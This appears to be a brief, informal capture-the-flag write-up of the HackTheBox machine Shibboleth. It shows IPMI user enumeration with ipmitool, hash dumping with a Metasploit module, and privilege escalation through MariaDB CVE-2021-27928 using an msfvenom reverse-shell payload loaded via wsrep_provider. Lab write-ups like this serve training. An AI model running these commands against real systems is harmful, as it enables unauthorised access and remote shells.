@@ -1,0 +1,36 @@
+i saw the site at first nothing was obvious then i did sub domain enum and got  3 domains
+
+one was loging page but i didnt have creds
+
+there was aline Bare Metal ==BMC== automation  on lloking for it on google it says ==IPMI==
+
+there was  a tool
+
+```
+└─$ ipmitool -I lanplus -H 10.10.11.124 -U '' -P '' user
+```
+
+we got conformation of user Aministrator then we used msfconsole to get hash
+
+`msf6 auxiliary(scanner/ipmi/ipmi_dumphashes`
+
+we got hash
+
+we logged in
+
+now to upload shell we used ==base64==
+
+just read it https://0xdf.gitlab.io/2022/04/02/htb-shibboleth.html
+
+and for priv esc
+
+we had ==mariadb== outdated version
+
+```
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f elf-so -o CVE-2021-27928.so
+
+mysql -u <user> -p -h <ip>
+SET GLOBAL wsrep_provider="/tmp/CVE-2021-27928.so";
+```
+
+we got shell on listening to the port
